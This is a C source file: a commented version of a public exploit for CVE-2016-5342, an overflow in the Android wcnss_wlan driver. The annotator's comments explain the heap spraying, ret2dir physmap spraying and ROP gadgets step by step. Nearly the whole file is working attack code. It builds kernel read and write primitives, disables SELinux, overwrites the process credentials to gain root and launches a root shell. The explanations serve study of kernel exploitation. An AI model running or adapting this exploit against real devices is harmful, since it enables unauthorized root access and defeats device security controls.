// A commented version of freener's exploit on CVE-2016-5342
// from : https://github.com/freener/exploits/blob/master/CVE-2016-5342/exploit_tty_bypass_pxn.c
// You might want to read 'exploit_mp3_bypass_pxn_commented.c' first because I left out all comments that would be explaining the same thing over again.

/*
 *  Author: freener.gdx@gmail.com
 *  Date  : 2016.7
 * 	root@bacon:/data/local/tmp # ./exploit_tty_bypass_pxn                          
 *	[+] Exploit Test Begain
 *	[+] Spray Kmalloc-1024 Slab
 *	[+] Ret2dir Spray ...
 *	[+] Modify Operation from 0 to c04dbe88
 *	[+] Release one object in slab
 *	[+] Bang!!! Overflow!!!
 *	[+] Try to get the control
 *	[+] OverWrite Success ptm
 *	[+] SELINUX = 1
 *	[+] CRED address : e702df80
 *	[+] Change to ROP_WRITE
 *	[+] Modify Operation from c04dbe88 to c0760fe4
 *	[+] Close Selinux
 *	[+] Modify CRED
 *	[+] Root Success
 *	root@bacon:/data/local/tmp # 
 */

#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>

// physmap start address. Read more about physmap and ret2dir on :
// https://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf
#define PHYS_OFFSET 0xC0000000

// the magic value that gets stored upon tty initialization into tty_struct->magic
#define TTY_MAGIC 0x5401

// number of objects to spray : 167
#define ONEOFF_ALLOCS ( 8 * 20 + 7 )
// the index of the object to free, hence, creating a hole. The objects created last will have a high chance to be allocated determiniticly(sequentially), so the 3rd last object is being targeted.
#define UNLUCKLY_ONE  ( ONEOFF_ALLOCS - 2 )

// These addresses, offsets can either be retrieved from /proc/kallsyms, or from the disassembly of the kernel.
#define SELINUX_ENFORCING (0xC16A7070)

#define INIT_TASK_ADDRESS (0xC14F6040)
#define COMM_OFFSET ( 0xC14F635C - INIT_TASK_ADDRESS )
#define TASK_OFFSET ( 0xC14F6218 - INIT_TASK_ADDRESS )
#define PID_OFFSET  ( 0x0 )
#define CRED_OFFSET ( COMM_OFFSET - 8 )

// This will hold the file descriptor of our corrupted target tty_struct
int effect_fd = 0;
// This is where we will spray 'PAGE_SIZE * 256 * 800' amount of data to userspace, and this spray will eventually be mapped to kernelspace via physmap
char *mmap_base = NULL;
/**
 *
 *   ROP_READ
 *   C04DBE88  LDR  R0, [R2]
 *   C04DBE8C  BX   LR
 */
#define ROP_READ  ( 0xC04DBE88 )
// This provides a convenient 'Read 4 bytes from address' primitive.
unsigned int kernel_read( unsigned int dummy, unsigned int address )
{
    unsigned int value;
    value = ioctl( effect_fd, dummy, address );
    return value;
}

/**
 *   ROP_WRITE GATGAD
 *   C0760FE4   STR R2, [R1]
 *   C0760FE8   BX  LR
 */
#define ROP_WRITE ( 0xC0760FE4 )
// This provides a convenient 'Write 4 bytes to address' primitive.
void kernel_write( unsigned int address, unsigned int value )
{
    ioctl( effect_fd, address, value );
}
+
// This is the meat of the ret2dir attack. By allocating and writing tons of data into userspace, this data will be cloned and readily available within the physmap
// region in the kernel. Actually, the data is not copied but only a window to the data is created and mapped to physmap for the kernel use, but that's not important.
// What's important is that we can spray attacker controlled data into kernelspace and expect an attacker controlled data to be in a predictable, fixed address within kernelspace!
// This would effectively bypass SMAP if it were implemented in android, but it is still far from being added into the android kernel as of this date, so this would only
// serve as a nice primitive to put attacker controlled data on a fixed address.
void ready_operation( unsigned int operation )
{
    if ( operation != ROP_READ && operation != ROP_WRITE ) {
        printf( "[-] Invalid Operation\n" );
        return;
    }

    printf( "[+] Modify Operation from %x to ", *(unsigned int*)mmap_base );
    int i, z;
    // On every sprayed page, it is placing an ROP gadget address(operation) in the first 64 dwords of the page. This would eventually serve as the fake tty_operations object,
    // of which the fake object's address will eventually be overwritten to tty_struct->ops. For tty_operations struct, check : http://lxr.free-electrons.com/source/include/linux/tty_driver.h#L251
    for ( i=0; i< 256 * 800 * 4; i++ ) {
        for ( z=0; z<64; z++ )
            *(unsigned int *)(mmap_base + i * 1024 + z * 4) = operation;
    }
    printf( "%x\n", *(unsigned int *)mmap_base );
}

// This is a standard procedure to create a ptm/pts device. By creating a pts device, a new entry /dev/pts/N will be installed and the corresponding install function in kernel will be invoked.
// This is the same for the ptm device which is transparently installed as a minor device by the kernel, but not exported as a file node. Hence, install will be invoked for ptm also.
// The install function is 'pty_unix98_install', and it will in turn call 'pty_common_install' which in turn executes 'o_tty = alloc_tty_struct();'. This will execute
// 'return kzalloc(sizeof(struct tty_struct), GFP_KERNEL);' and allocate a 'tty_struct' in kernel memory. This struct is huge. Refer to the following link for details :
// http://lxr.free-electrons.com/source/include/linux/tty.h#L270
// The important thing in terms of the exploit is, *two* 'tty_struct's will be allocated in the kmalloc-1024 slab.
int openpty(int* master, int* slave, char* name ) {
  *master = getpt();
  if (*master == -1) {
    return -1;
  }

  if (grantpt(*master) == -1 || unlockpt(*master) == -1) {
    close(*master);
    return -1;
  }

  char buf[32];
  if (name == NULL) {
    name = buf;
  }
  if (ptsname_r(*master, name, sizeof(buf)) != 0) {
    close(*master);
    return -1;
  }

  *slave = open(name, O_RDWR|O_NOCTTY);
  if (*slave == -1) {
    close(*master);
    return -1;
  }

  return 0;
}

// our marker for task_struct->comm
char *name = "freener_pwn0";
int main() {

    pid_t self;
    self = getpid();
    
    // Setting task_struct->comm to our marker
    prctl( PR_SET_NAME, (unsigned long)name, 0, 0, 0 );
    printf( "[+] Exploit Test Begain\n" );

    // The huge 'tty_struct' is big enough to fit in the kmalloc-1024 slab. Since this slab doesn't really get used much, it's okay to allocate only
    // 8 * 20 + 7 (ONEOFF_ALLOCS) <- this much to defragment the heap. At the same time, it's spraying target tty_struct objects that will be overwritten.
    printf( "[+] Spray Kmalloc-1024 Slab\n" );
    int i;
    int ptm_fds[ONEOFF_ALLOCS];
    int pts_fds[ONEOFF_ALLOCS];
    for (i = 0; i < ONEOFF_ALLOCS; ++i) {
        if (openpty(&ptm_fds[i], &pts_fds[i], NULL) == -1) {
            puts("[-] pty creation failed");
            return 1;
        }
    }

    // opening our vulnerable driver
    int fd_wlan;
    fd_wlan = open( "/dev/wcnss_wlan", O_RDWR | O_NOCTTY );
    if ( fd_wlan < 0 ) {
        printf( "[-] Can not open /dev/wcnss_wlan\n" );
        return -1;
    }

    // Setting up our payload to feed into '/dev/wcnss_wlan', where it overflows to the succeeding buffer which is hopefully a tty_struct object.
    char *buffer1 = NULL;
    int message1_len = 1024 +  28 ;
    buffer1 = (char *)malloc( message1_len );
    if ( buffer1 == NULL ) {
        printf("[-] Failed to create message\n" );
        return -1;
    }
    memset( buffer1, 0, message1_len );

    // It is overflowing the tty_struct just right up to 'int index;'. See the definition of tty_struct for details : http://lxr.free-electrons.com/source/include/linux/tty.h#L270
    // Actually, all other members are unimportant except for the 'const struct tty_operations *ops;' member. This member will be explained later.
    unsigned int kernelAddress;
    // This is the predictable address where our physmap spray data exists. It's actually the last page in the physmap because the physmap size in Aarch32 is 760 MB.
    kernelAddress = PHYS_OFFSET + 760 * 1024 * 1024 - PAGE_SIZE;
    int length = 1024;
    *(unsigned int *)buffer1 = length;
    *(unsigned int *)(buffer1 + length )     = TTY_MAGIC;
    *(unsigned int *)(buffer1 + length + 4)  = 0xDEADBEEF;
    *(unsigned int *)(buffer1 + length + 8)  = kernelAddress;
    *(unsigned int *)(buffer1 + length + 12) = kernelAddress;
    *(unsigned int *)(buffer1 + length + 16) = kernelAddress;
    // This is totally bogus. It's setting members outside the buffer and doesn't make any sense. The exploit might actually crash because of this.
    // I think this is the exploit author's mistake and message1_len should have been 1024+1024+28 instead of 1024+28.
    // The author's original intention was to overwrite both tty_structs for the ptm/pts device pair, but as the following code shows, only ptm's tty_struct is overwritten instead.
    *(unsigned int *)(buffer1 + length + 1024 )     = TTY_MAGIC;
    *(unsigned int *)(buffer1 + length + 1024 + 4)  = 0x1337;
    *(unsigned int *)(buffer1 + length + 1024 + 8)  = kernelAddress;
    *(unsigned int *)(buffer1 + length + 1024 + 12) = kernelAddress;
    *(unsigned int *)(buffer1 + length + 1024 + 16) = kernelAddress;

    printf( "[+] Ret2dir Spray ...\n" );
    int j;

    // This is preparing the huge block of memory that will be mapped into the kernel physmap region.
    length = (size_t)PAGE_SIZE * 256 * 800;
    mmap_base = mmap( NULL, length, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, (off_t)0 );
    if ( mmap_base == MAP_FAILED ) {
            printf( "[-] MMAP Failed\n" );
            perror( "[-]" );
            return -1;
    }
    // It's filling the huge block of memory with ROP_READ. Actually, it filled up the entire physmap region because in Aarch32, the physmap max size 760MB.
    // Now we can assume that in a predictable address(kernelAddress variable) in kernelspace, A group of ROP_DATA will exist.
    ready_operation( ROP_READ );

    printf( "[+] Release one object in slab\n" );
    // kfreeing the 'tty_struct' object associated with the ptm
    close( ptm_fds[UNLUCKLY_ONE] );
    // kfreeing the 'tty_struct' object associated with the pts
    close( pts_fds[UNLUCKLY_ONE] );

    printf( "[+] Bang!!! Overflow!!!\n" );
    int count = 0;
    // The kmalloc(size) would fill in the last deallocated buffer, which is pts's tty_struct object. Therefore, ptm_fdm[UNLUCKLY_ONE+1]'s tty_struct would come directly next,
    // and then the ptm_fds[UNLUCKLY_ONE+1]'s tty_struct. Therefore, using the above overflow, only ptm_fdm[UNLUCKLY_ONE+1]'s tty_struct object will be overwritten
    // instead of the author's original intention which was to overflow both objects.
    count = write( fd_wlan, buffer1, message1_len + 4 );
    
    printf( "[+] Try to get the control\n" );
    
    // Trying to determine which tty_object got overwritten by calling the arbitrary read primitive. How does this actually work...? Let's first see what the overflow actually written.
    //
    // *(unsigned int *)(buffer1 + length )     = TTY_MAGIC;
    // *(unsigned int *)(buffer1 + length + 4)  = 0xDEADBEEF;
    // *(unsigned int *)(buffer1 + length + 8)  = kernelAddress;
    // *(unsigned int *)(buffer1 + length + 12) = kernelAddress;
    // *(unsigned int *)(buffer1 + length + 16) = kernelAddress;
    //
    // and the definition of tty_struct :
    //
    // struct tty_struct {
    //   int     magic;
    //   struct kref kref;
    //   struct device *dev;
    //   struct tty_driver *driver;
    //   const struct tty_operations *ops;
    //   int index;
    //   ...
    //   ...
    //
    // So now it becomes clear what member of the tty_struct object was overwritten with which value. All others are just filling in dummy values, or a valid writable kernel address in order to
    // not make the kernel crash, but the most important field is the 'const struct tty_operations *ops;' member. By overwriting this field, we can totally control the execution when any of the function pointers in
    // the ops member invoked. There are a whole bunch of function pointers in that member. Check here : http://lxr.free-electrons.com/source/include/linux/tty_driver.h#L251
    // One of the functions in the list is 'int  (*ioctl)(struct tty_struct *tty, ...' which the following code uses to gain arbitrary write primitive.
    // But wait... why is it overwriting 'ops' with kernelAddress?? What exactly is in kernelAddress? Remember from above where we sprayed 800MB of data(ROP_READ) to map that exact data into physmap in kernelspace?
    // Now that physmap is completely full with ROP_READ, we can safely conclude that packs of ROP_READ dwords exist on the last page of physmap, which is the address stored in the kernelAddress variable.
    unsigned int value;
    if ( (value = ioctl( ptm_fds[UNLUCKLY_ONE+1], 0xdeadbeef, kernelAddress + 50*4 )) == ROP_READ ) {
        printf( "[+] OverWrite Success ptm\n" );
        effect_fd = ptm_fds[UNLUCKLY_ONE + 1];
    }
    // Because of the programing error above, pts_fds will never be overwritten except in very rare occasions.
    else if ( (value=ioctl( pts_fds[UNLUCKLY_ONE+1], 0xdeadbeef, kernelAddress + 50*4)) == ROP_READ ){
        printf( "[+] OverWrite Success pts\n" );
        effect_fd = pts_fds[UNLUCKLY_ONE + 1];
    }

    if ( effect_fd == 0 ) {
        printf( "[+] OverWrite Failed\n" );
        return -1;
    }

    // Reading the current SELINUX_ENFORCING global variable from kernelspace with our arbitray read primitive.
    unsigned int selinux;
    selinux = kernel_read( 0xBBBBBBBB, SELINUX_ENFORCING ); //ioctl( effect_fd, 0xBBBBBBBB, SELINUX_ENFORCING );
    printf( "[+] SELINUX = %d\n", selinux );

    /**
     *   Find MySelf
     */
    // This is basically the same as 'exploit_mp3_bypass_pxn_commented.c'. Refer to 'exploit_mp3_bypass_pxn_commented.c' for details on the exact meaning of the following code.
    unsigned int task = 0;
    task = kernel_read( 0x10000001, (INIT_TASK_ADDRESS + TASK_OFFSET) );
    unsigned int cred = 0;
    unsigned int magic = 0;
    unsigned int magic1 = 0;
    unsigned int comm_address = 0;
    char comm_name[17] = { 0 };
    unsigned int comm_part_one = 0, comm_part_two = 0, comm_part_three = 0;
    do {
        //printf( "[+] TASK Address : %x\n", task );

        comm_address = task - TASK_OFFSET + COMM_OFFSET;
        //printf( "[+] Comm Address : %x\n", comm_address );
        comm_part_one = kernel_read( 0x20000002, task - TASK_OFFSET + COMM_OFFSET );
        comm_part_two = kernel_read( 0x20000002, task - TASK_OFFSET + COMM_OFFSET + 4 );
        comm_part_three  = kernel_read( 0x20000002, task - TASK_OFFSET + COMM_OFFSET +8 );
        (*(unsigned int *)comm_name) = comm_part_one;
        (*(unsigned int *)(comm_name+4)) = comm_part_two;
        (*(unsigned int *)(comm_name+8)) = comm_part_three;

        //printf( "[+] Command line : %s\n", comm_name );

        if ( comm_part_one == 0x65657266 &&
             comm_part_two == 0x5F72656E &&
             comm_part_three == 0x306E7770 ) {
            cred = kernel_read( 0x30000003, task - TASK_OFFSET + CRED_OFFSET ); 
            printf( "[+] CRED address : %x\n", cred );
            magic = kernel_read( 0x40000004, cred + 12 );     
            break;
        }
        task = kernel_read( 0x20000002, task - TASK_OFFSET + TASK_OFFSET ); 
    } while ( task != (INIT_TASK_ADDRESS + TASK_OFFSET) );


    if ( task == INIT_TASK_ADDRESS ) {
        printf( "[-] Do not find myself\n" );
    }
    if ( cred == 0 ) {
        printf( "[-] Do not get CRED address\n" );
        return -1;
    }

    if (  magic != 0x43736564 || magic != 0x44656144 ) {
        magic = 4;
    }
    else {
        magic = 16;
    }

    printf( "[+] Change to ROP_WRITE\n" );
    // This is where it differs from 'exploit_mp3_bypass_pxn_commented.c'. We now know how physmap works, so we can infer the following code as filling the physmap with ROP_WRITE.
    // Therefore, when tty_struct->ops->ioctl is called, tty_struct->physmap_last_page->ROP_WRITE will be called instead and provide us with a neat 'write 4 bytes anywhere' primitive.
    ready_operation( ROP_WRITE );

    printf( "[+] Close Selinux\n" );
    // Using our write primitive to turn off SELINUX
    kernel_write( SELINUX_ENFORCING, 0x0 );

    printf( "[+] Modify CRED\n" );

    // Refer to 'exploit_mp3_bypass_pxn_commented.c'.
    for ( i=0; i<17; i++ ) {
        if ( i < 8 ) {
            kernel_write( cred + magic + i*4, 0x0 );
        }
        else if ( i == 8 ) {
            continue;
        }
        else {
            kernel_write( cred + magic + i*4, 0xFFFFFFFF );
        }
    }

    if ( getuid() == 0 ) {
        printf( "[+] Root Success\n" );
        execl( "/system/bin/sh", "/system/bin/sh", NULL );
        return 1;
    }

    printf( "[+] Failed \n" );

    return 0;
}